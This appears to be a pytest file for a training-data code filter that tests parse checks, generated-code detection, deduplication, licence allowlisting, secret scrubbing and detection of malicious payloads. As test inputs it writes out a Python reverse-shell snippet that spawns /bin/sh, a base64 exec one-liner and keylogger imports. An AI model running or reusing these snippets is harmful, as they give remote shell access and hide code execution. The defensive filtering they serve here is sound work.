def test_quality_and_payload_filters():
    assert P.python_parse_reason(CODE) is None
    assert P.python_parse_reason("print 'python 2'") == "python-parse-failed"
    assert P.generated_reason(CODE) is None
    assert P.generated_reason("# Generated by the protocol buffer compiler.  DO NOT EDIT!\nx = 1\n") == "generated-marker"
    assert P.generated_reason("x = [" + "1, " * 600 + "]\n") == "minified-long-line"
    assert P.generated_reason('"""Values generated by a seeded random source."""\nx = 1\n') is None
    reverse = "import socket,os,pty\ns=socket.socket()\ns.connect(('h',1))\nos.dup2(s.fileno(),0)\npty.spawn('/bin/sh')\n"
    assert P.payload_reason(reverse) == "payload-reverse-shell"
    assert P.payload_reason("exec(base64.b64decode(blob))") == "payload-obfuscated-exec"
    assert P.payload_reason("from pynput.keyboard import Listener\nimport smtplib\n") == "payload-keylogger"
    assert P.payload_reason(CODE) is None


def test_gate_scrubs_dedups_and_records_reasons():
    gate, stats = P.CodeGate(), P.SourceStats("test")
    secret = CODE + "\nAWS = 'AKIAABCDEFGHIJKLMNOP'\n"
    kept = gate.check(secret, ["MIT"], stats)
    assert kept is not None and "AKIA" not in kept
    assert gate.check(secret, ["MIT"], stats) is None
    edited = CODE.replace("return default", "return default  # fallback") + "\nAWS = 'AKIAABCDEFGHIJKLMNOP'\n"
    assert gate.check(edited, ["MIT"], stats) is None
    assert gate.check("def other(q):\n    return q * 3 - 1\n" * 3, ["GPL-2.0"], stats) is None
    unrelated = "\n".join(f"def handler_{i}(event):\n    return event.get('k{i}', {i})" for i in range(30))
    assert gate.check(unrelated, ["Apache-2.0"], stats) is not None
    d = stats.to_dict()
    assert d["rows_in"] == 5 and d["rows_out"] == 2
    assert d["dropped"] == {"exact-duplicate": 1, "licence-not-allowlisted": 1, "near-duplicate": 1}
    assert d["scrubbed"]["AWS_ACCESS_KEY_ID"] == 1 and d["licences"] == {"Apache-2.0": 1, "MIT": 1}


